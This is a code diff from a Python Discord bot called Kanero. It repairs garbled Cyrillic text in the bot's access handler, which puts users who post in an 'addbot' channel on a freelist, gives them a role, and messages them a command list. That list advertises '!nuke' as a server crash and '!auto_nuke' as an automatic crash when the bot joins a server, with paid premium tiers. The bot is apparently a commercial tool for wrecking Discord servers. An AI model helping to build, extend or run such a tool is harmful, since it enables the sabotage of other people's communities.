@@ -6043,7 +6043,7 @@ async def on_message(message):
             pass
         return
 
-    # -- ����� addbot �� подписка истекла � ����� freelist ----------------------
+    # -- Канал addbot на домашнем сервере - выдача freelist ----------------------
     if (message.guild and message.guild.id == HOME_GUILD_ID
             and ("addbot" in message.channel.name.lower())
             and not message.author.bot):
@@ -6058,10 +6058,10 @@ async def on_message(message):
             try:
                 await message.author.send(
                     embed=discord.Embed(
-                        title="❌ � ���� ��� ���� ������� ������",
+                        title="✅ У тебя уже есть доступ к боту",
                         description=(
-                            "�� ��� � freelist � ����все параллельно� `!nuke` � `!auto_nuke`.\n\n"
-                            "��� ����подписка истекла ������: **davaidkatt**"
+                            "Ты уже в freelist и можешь использовать `!nuke` и `!auto_nuke`.\n\n"
+                            "Для покупки подписки пиши: **davaidkatt**"
                         ),
                         color=0x0a0a0a
                     ).set_footer(text="Kanero  |  davaidkatt")
@@ -6071,7 +6071,7 @@ async def on_message(message):
         else:
             FREELIST.append(uid)
             save_freelist()
-            # ����� ���� 🤖 User �� подписка истекла
+            # Выдаём роль 👥 User на домашнем сервере
             try:
                 home_guild = bot.get_guild(HOME_GUILD_ID)
                 if home_guild:
@@ -6081,22 +6081,22 @@ async def on_message(message):
                     if member:
                         user_role = discord.utils.find(lambda r: r.name == "👥 User", home_guild.roles)
                         if user_role:
-                            await member.add_roles(user_role, reason="Freelist � ������� � addbot")
+                            await member.add_roles(user_role, reason="Freelist - написал в addbot")
             except Exception:
                 pass
             try:
                 await message.author.send(
                     embed=discord.Embed(
-                        title="❌ ������� ������ �������!",
+                        title="✅ Доступ к боту получен!",
                         description=(
-                            "�� навсегда � freelist � ������� ���� **🤖 User**.\n\n"
-                            "**�подписка истекла:**\n"
-                            "`!nuke` � ���� �������\n"
-                            "`!auto_nuke on/off` � ����-���� ��� ����� ����\n"
-                            "`!help` � ������ ������\n"
-                            "`!changelog` / `!changelogall` � ������� навсегда��\n\n"
-                            "��� White/Premium ������: **davaidkatt** | **@Firisotik**\n\n"
-                            "��� ������: https://discord.gg/nNTB37QNCG"
+                            "Ты добавлен в freelist и получил роль **👥 User**.\n\n"
+                            "**Доступные команды:**\n"
+                            "`!nuke` — краш сервера\n"
+                            "`!auto_nuke on/off` — авто-краш при входе бота\n"
+                            "`!help` — список команд\n"
+                            "`!changelog` / `!changelogall` — история обновлений\n\n"
+                            "Для White/Premium пиши: **davaidkatt** | **@Firisotik**\n\n"
+                            "Наш сервер: https://discord.gg/nNTB37QNCG"
                         ),
                         color=0x0a0a0a
                     ).set_footer(text="Kanero  |  davaidkatt")
